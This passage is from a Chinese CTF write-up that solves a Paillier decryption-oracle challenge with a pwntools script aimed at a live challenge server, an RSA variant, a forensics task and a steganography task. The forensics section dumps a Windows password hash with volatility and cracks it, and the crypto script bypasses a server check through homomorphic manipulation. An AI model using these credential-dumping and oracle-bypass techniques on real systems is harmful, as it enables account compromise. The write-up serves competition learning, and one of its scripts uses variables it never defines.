            R = 2 * random.randint(0, 39)
            I = random.randint(0, 1)
            cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R])
            cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1])
            self._send("This is a ciphertext.")
            self._send(str([cipher1, cipher2][I]))
```

然后我们可以输入一次密文来得到明文,但不能输入cipher1和cipher2

```python
cipher = int(self._recv().decode())
            plaintext = str(dec(n, g, LAM, cipher))
            if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]:
                return
            self._send("This is the corresponding plaintext.")
            self._send(plaintext)
```

根据同态的原理可以构造payload绕过检测

$C_0={C_1}^{m_1}=g^{m_1 * m_1 * m_2 * k}r^n \;mod \;n^2$

解密后可以得到：

$M\div(m_1 * m_1 * m_2)=k$

此时如果输入1如果报错则当前k对应的下标是0，否则下标为1

又因为

```python
assert key[0] == 119 and key[1] ==  241 and key[2] ==  718 and key[3] == 647
```

由这个hint我们知道服务器上面的key是不变的

只要重复访问服务器就能把key表oracle出来然后解得到key到我们记录的表里面去找就好了

#### solution

```python

import random
import hashlib
from math import gcd
from pwn import *  
from icecream import *
from MyRE import CatNum
from itertools import product
# from MyRE import *
# from rich import *
from rich.traceback import install
install()
# -----------------------------------

String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz" 
# nc 47.104.85.225 57811



def pow1():
    io.recvuntil('?+')
    s2 = io.recvuntil(') ')[:-2]
    HASH = io.recvuntil('\n')[3:-1]
    print(s2)
    print(HASH)
    for i in product(String,repeat=4):
        s1 = ''.join(i)
        # print(s1.encode())\
        s1 = s1.encode()
        s0 = s1+s2
        # print(s0)
        HASH1 = hashlib.sha256(s0).hexdigest().encode()
        # print(HASH1)
        # input()
        if(HASH==HASH1):
            print(s1)
            io.sendline(s1)
            return
        
def enc(n, g, m):
    while 1:
        r = random.randint(2, n - 1)
        if gcd(r, n) == 1:
            break
    c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2)
    return c
def init():
    # pow1()
    # io.interactive()
    buf = io.recvuntil('round')
    round = io.recvuntil('Step 1')
    ic(round)
    io.recvuntil('KeyGen. This is my public key.')

    buf = io.recvuntil('Step ')
    ans = CatNum(buf)
    n,g = int(ans[0]),int(ans[1])
    ic(n)
    ic(g)
    
    return n,g
# =====================================
#循环中输出的key手动放到这里重复利用
key0=set()
key1=set()
def get_index(k):
    if(k in key0):
        return '0'
    else:
        return '1'

def oracle(n,g):
    
    io.recvuntil('Please give me one decimal ciphertext.\n')
    c = enc(n,g,123321123321123321123321)
    io.sendline(str(c))
    io.recvuntil('Step 3')
    io.recvline()
# s3
    m1 =  787
    m2 =  929
    io.recvuntil('Give me m0.\n')
    io.sendline(str(m1))
    io.recvuntil('Give me m1.\n')
    io.sendline(str(m2))
    
    io.recvuntil('This is a ciphertext.\n')
    buf = io.recvline()
    ans = CatNum(buf)
    c1 = int(ans[0])
    # print(buf,c1)
    # init


    x1 = enc(n,g,787)
    c1x1 = pow(c1,m1,n**2)
    # ic(c1x1)
    io.sendline(str(c1x1))

    io.recvuntil('This is the corresponding plaintext.\n')
    buf = io.recvline()
    # print(ans)
    ans = CatNum(buf)
    tmp = int(ans[0])
    io.recvuntil('-> c0 , m1 -> c1)?\n')
    k = (tmp)//(m1*m2*m1)
    ic(k)
    _01 = get_index(k)
    io.sendline(_01)
    res = io.recvline()
    print(res)
    # io.interactive()
    return res,k
    
time=0
# nc 47.104.85.225 57811
io = remote('47.104.85.225',57811)     
pow1() 
for i in range(100):
    
    
    
    n,g = init()
    res,k = oracle(n,g)

    if(b'Sorry' in res):
        print(f'{k}:0')
        key0.add(k)
        time=0
        io.close()
        io = remote('47.104.85.225',57811)   
        pow1()      
    else:
        sleep(0.25)
        print(f'{k}:1')
        key1.add(k)
        time+=1
    if(time==32):
        print('get it')
        print(io.recv(2048))
        exit()
    
    
    print(f'key0={key0}')
    print(f'key1={key1}')
    print(time)
   
```

---


```shell
ic| round: b' 32
           Step 1'
ic| n: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922097
ic| g: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922098
ic| k: 130
b'Good! You are right\n'
130:1
get it
b'flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}\n'
[*] Closed connection to 47.104.85.225 port 57811
```

### myRSA

> 小数学题，利用各种姿势消去z对解密得影响

核心点

```python
def encry(message,key,p,q,e):
    k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)]
    x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) 
    y = 2*p*q + p + q
    z = k1 + k2 
    c = pow(b2l(message),e,p*q)
    return x * c + y * c + z # enc
```

首先

$设t=p+q$

$(enc-z)/c=(x+y)-4n=t^3-t^2+t$

但由于  $f(t)=t^3-t^2+t-9999=0$   的图像几乎是一条直线，我们推断，此时z对于解这个方程没有实质性的影响



测试后发现确实可以无视第一次加密时z的影响

解密时也可以用x+y消去z对flag的影响

`ic(z//(x+y))==0`



```python
from Crypto.Util.number import *
from Crypto.Util.number import getPrime,bytes_to_long as b2l
import libnum
from gmpy2 import iroot
from icecream import *
import sympy as sp  # 导入sympy包、

def getpq(n,e,enc,c):
    tmp = 400000
    ic(tmp)
    ans = enc//c -tmp -4*n
    
    x = sp.Symbol('x')  # 定义符号变量
    f = x**3 - x**2 + x - ans  # 定义要求解的一元三次方程
    ans = sp.solve(f)
    # print(ans)
    
    t = int(ans[2].round())
    ic(t)
    tmp = iroot(t*t-4*n,2)
    ic(tmp)
    if(tmp[1] == True):
        delta = tmp[0]
        p = (t+delta)//2
        ans = t**3 - t**2 + t
        print(n%p)
        ic(p)
        return p
# 一次交互后得到的数据
n = 66027874281672625418586014781126070908243950646389324074550248999679090401150270793389452270314828298481437497840416396018574761898600856029902467560028361877554457938912404358968210921272837218306889478597234820590780596868027285957738861052042217870708996313230729115851397741357365848182263953315379303203
e = 65537
message = b'1231231312312312313123'
c = pow(b2l(message),e,n)
enc = 2786282534107784071949674754303734020650420550514064517704448066809278965224884310691670432441397979710035489386642473027744366146283566077172758576117265010888225901430814453103910642061532363684990980080593171873048076522753507082554621333455105446034271978972878134597921516292423901550995709181303022297139396128082022193615685724911328311390083321186035987746342068856533118816750276771278003232809361817465525887406183533073435476911136829775173155132394236172457900926847903014330722145729653282601258124899631596559793043199596264295846181613188399943356771658381560774428425036945242894731920547142207496951001372212394788053725065262462489938796299464287972476543278196732420981982981923866883740677815684307375214870832207719694203331026829445710224285190480
flagenc = 78903156043541822956852921255839504785260043170754244208159263853595508405000661899479307588531494172830632220991906679919999441798497272603229277113581316208572288228086544225197245626229321664099299589135332933949675253738548931053641537046898654150676091285693057337873250759686984233682913388477992334871253653295943818266597281224943136933411417199795127815822097900855479634034406709830823051590719193303685067733559940313006125179805670789881285419162909762014157603424444680011222474284489067733520824336575376527926069324059697680207015464280592590151869974781941122398578485426146276184697907560587701585522746826606269636562989809117072089021357481402267496699431701068851120069674664273560247308363437176623358041554600504472302094490793591097239195676611890
# =========================
p =getpq(n,e,enc,c)
q = n//p
print(n==p*q)
# k = k1+k2    
x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) 
y = 2*p*q + p + q
z = enc-(x+y)*c
print(z)
# print(z==k)

flagc = (flagenc)//(x+y)
ic(z//(x+y))

# q=n//p
# print(q)
# n=p*q
phi=(p-1)*(q-1)

d = libnum.invmod(e,phi)
print(long_to_bytes(pow(flagc,d,n)))
# bytes_to_long()
# long_to_bytes()
'''
return x * c + y * c + z
'''
# flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1}
```



## misc

### 层层取证

拿到文件，先用取证大师看一下，未发现可疑的文件

挂载硬盘，有一个加密的分区，没有线索可以解开，然后发现存在一个名为Windows7的盘，进去到用户XiaoMing，访问到桌面发现flag.txt

文件内容：你连电脑都不能仿真打开，还想要flag ?

根据提示 ，需要将硬盘启动来获取更多消息

用工具将硬盘另存为vmhd格式，新建一个win7虚拟机打开虚拟硬盘文件即可开机，进入系统，出现XiaoMing用户，发现有密码。
可以利用用volality的插件 hashdump

```
.\volatility_2.6_win64_standalone.exe -f ..\memdump.mem --profile=Win7SP1x64 hashdump

XiaoMing:1001:aad3b435b51404eeaad3b435b51404ee:92efa7f9f2740956d51157f46521f941:::
```



在CMD5解密 得到密码 xiaoming_handsome

桌面存在提示

```
Aw我已经做好了万全的准备
1.文件加密
2.磁盘加密
3.电脑加密
…………

但我不会乱设密码，不然自己都记不住

word文档密码：
xiaoming1314
```

根据之前解的 xiaoming_handsome 和提供的文档密码，测试一些组合

```
xiaoming123
xiaomimg_handsome
xiaoming1314
XIAOMING
XiaoMing
…………
```

在XiaoMing时解开了加密分区，拿到了一个流量文件，直接利用桌面提供的wireshark进行分析，看到里面一段UDP，直接追踪流，然后看到开头的rar头，直接save as为rar，打开压缩文件，附带提示，与开机密码相同，利用 xiaoming_handsome拿到flag.docx 再拖出到宿主机 输入xiaoming1314打开拿到flag

### 鸣雏恋

打开docx文档，没有信息，观测docx大小，明显不对劲，以压缩文件方式打开

在_rels里看到 有key.txt 和love.zip

压缩包有加密，打开key，看到光标移动有卡顿，有零宽字符，直接拿去解密

```
佩恩‌‌‌‌‍‌‌‬‌‌‌‌‍‬‍‍:凭你这点力量,‌‌‌‌‍‬‌﻿‌‌‌‌‍‬‌‍为什么要战斗‌‌‌‌‍﻿‍‍?
‌‌‌‌‍﻿‌﻿‌‌‌‌‍‬‍‍‌‌‌‌‌‬‌‌雏田‌‌‌‌‍‌‬‍‌‌‌‌‌‬‌‌‌‌‌‌‍‬﻿‌:说到做到‌‌‌‌‍‬‬‍‌‌‌‌‍‬‬﻿‌‌‌‌‍‬‍‍,‌‌‌‌‌‬‌‌勇往直前‌‌‌‌‍‬﻿‬,‌‌‌‌‍‬‌‍这就是我的忍道.‌‌‌‌‍﻿‌‬‌‌‌‌‍﻿‍‍‌‌‌‌‍﻿‍‌‌‌‌‌‍‬﻿﻿‌‌‌‌‌‬‌‌‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‌﻿‌‌‌‌‍﻿‍‌
```



key 如下

```
Because I like naruto best
```

解密love，很多图片，分为两种 ，

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_af6dd5b6bdfeb58cabbfce78968bd8cf.png)

![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_2e48f2a88fabe304d86830c30c6c0d29.png)



猜测可能代表 0 和 1

```python
from PIL import Image

def decode(s):
    return ''.join([chr(i) for i in [int(b,2) for b in [s[i:i+8] for i in range(0,len(s),8)]]])

flag = ''
filepath = './misc/photo/out'
for i in range(129487):
    #files are 0 to 129486
    img = Image.open(path+str(i)+'.png')
    img_size = img.size
    x = img.width
    img.close()
    if x == 23 :
        result += '0'
        continue
    result += '1'

print(decode(result))

```

得到 data:image/png;base64,开头的base64，转图片得到flag
![](https://codimd.s3.shivering-isles.com/demo/uploads/upload_e535e339921dbbc226409ce1aec8c568.png)
